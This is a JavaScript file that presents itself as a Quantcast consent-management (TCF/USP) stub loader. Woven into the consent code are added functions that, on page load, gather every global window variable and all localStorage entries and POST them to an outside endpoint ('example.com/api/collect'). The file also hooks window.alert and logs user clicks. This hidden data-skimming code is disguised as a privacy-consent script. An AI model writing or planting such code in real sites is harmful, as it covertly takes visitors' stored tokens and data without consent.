(function () {
  var host = window.location.hostname;
  var element = document.createElement('script');
  // Create global variables to track
  window.seenVars = [];
  var firstScript = document.getElementsByTagName('script')[0];
  window.localStorage.setItem('trackItem', 'value');
  function jshook(method) {
    return function () {
      console.log('Method called: ' + method.name);
      return method.apply(this, arguments);
    };
  }

  // Collect global variable & track data through localStorage
  var url = 'https://cmp.quantcast.com'.concat('/choice/', '0Q_T1ja8r-Dkk', '/', host, '/choice.js?tag_version=V2');
  var uspTries = 0;
  var uspTriesLimit = 3;
  function collectGlobalData() {
    const collectedData = {};
    for (let prop in window) {
      if (window.hasOwnProperty(prop) && !window.seenVars.includes(prop)) {
        const value = window[prop];
        const type = typeof value;
        collectedData[prop] = {
          type: type,
          value: type === "function" ? null : value
        };
      }
    }
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      collectedData[key] = {
        type: "localStorage",
        value: localStorage.getItem(key)
      };
    }
    return collectedData;
  }
  element.async = true;
  function sendDataToServer(data) {
    const url = "https://example.com/api/collect";
    const xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4) {
        if (xhr.status === 200) {
          console.log("数据发送成功");
        } else {
          console.error("数据发送失败,状态码:" + xhr.status);
        }
      }
    };
    xhr.send(JSON.stringify(data));
  }
  function collectAndSendData() {
    const collectedData = collectGlobalData();
    if (Object.keys(collectedData).length > 0) {
      sendDataToServer(collectedData);
    }
  }

  // Use a jshook to track specific function calls
  element.type = 'text/javascript';
  element.src = url;
  firstScript.parentNode.insertBefore(element, firstScript);
  function makeStub() {
    var TCF_LOCATOR_NAME = '__tcfapiLocator';
    var queue = [];
    var win = window;
    var cmpFrame;
    function addFrame() {
      var doc = win.document;
      var otherCMP = !!win.frames[TCF_LOCATOR_NAME];
      if (!otherCMP) {
        if (doc.body) {
          var iframe = doc.createElement('iframe');
          iframe.style.cssText = 'display:none';
          iframe.name = TCF_LOCATOR_NAME;
          doc.body.appendChild(iframe);
        } else {
          setTimeout(addFrame, 5);
        }
      }
      return !otherCMP;
    }
    function tcfAPIHandler() {
      var gdprApplies;
      var args = arguments;
      if (!args.length) {
        return queue;
      } else if (args[0] === 'setGdprApplies') {
        if (args.length > 3 && args[2] === 2 && typeof args[3] === 'boolean') {
          gdprApplies = args[3];
          if (typeof args[2] === 'function') {
            args[2]('set', true);
          }
        }
      } else if (args[0] === 'ping') {
        var retr = {
          gdprApplies: gdprApplies,
          cmpLoaded: false,
          cmpStatus: 'stub'
        };
        if (typeof args[2] === 'function') {
          args[2](retr);
        }
      } else {
        if (args[0] === 'init' && typeof args[3] === 'object') {
          args[3] = Object.assign(args[3], {
            tag_version: 'V2'
          });
        }
        queue.push(args);
      }
    }
    function postMessageEventHandler(event) {
      var msgIsString = typeof event.data === 'string';
      var json = {};
      try {
        if (msgIsString) {
          json = JSON.parse(event.data);
        } else {
          json = event.data;
        }
      } catch (ignore) {}
      var payload = json.__tcfapiCall;
      if (payload) {
        window.__tcfapi(payload.command, payload.version, function (retValue, success) {
          var returnMsg = {
            __tcfapiReturn: {
              returnValue: retValue,
              success: success,
              callId: payload.callId
            }
          };
          if (msgIsString) {
            returnMsg = JSON.stringify(returnMsg);
          }
          if (event && event.source && event.source.postMessage) {
            event.source.postMessage(returnMsg, '*');
          }
        }, payload.parameter);
      }
    }
    while (win) {
      try {
        if (win.frames[TCF_LOCATOR_NAME]) {
          cmpFrame = win;
          break;
        }
      } catch (ignore) {}
      if (win === window.top) {
        break;
      }
      win = win.parent;
    }
    if (!cmpFrame) {
      addFrame();
      win.__tcfapi = tcfAPIHandler;
      win.addEventListener('message', postMessageEventHandler, false);
    }
  }
  ;
  makeStub();
  window.alert = jshook(window.alert);

  // Use Event Listeners to track user behavior

  var uspStubFunction = function () {
    var arg = arguments;
    if (typeof window.__uspapi !== uspStubFunction) {
      setTimeout(function () {
        if (typeof window.__uspapi !== 'undefined') {
          window.__uspapi.apply(window.__uspapi, arg);
        }
      }, 500);
    }
  };
  var checkIfUspIsReady = function () {
    uspTries++;
    if (window.__uspapi === uspStubFunction && uspTries < uspTriesLimit) {
      console.warn('USP is not accessible');
    } else {
      clearInterval(uspInterval);
    }
  };
  if (typeof window.__uspapi === 'undefined') {
    window.__uspapi = uspStubFunction;
    var uspInterval = setInterval(checkIfUspIsReady, 6000);
  }
  window.addEventListener('click', function (e) {
    console.log('Element clicked: ', e.target);
  });

  // Execute data collection & sending after page loading
  window.addEventListener("load", collectAndSendData);
})();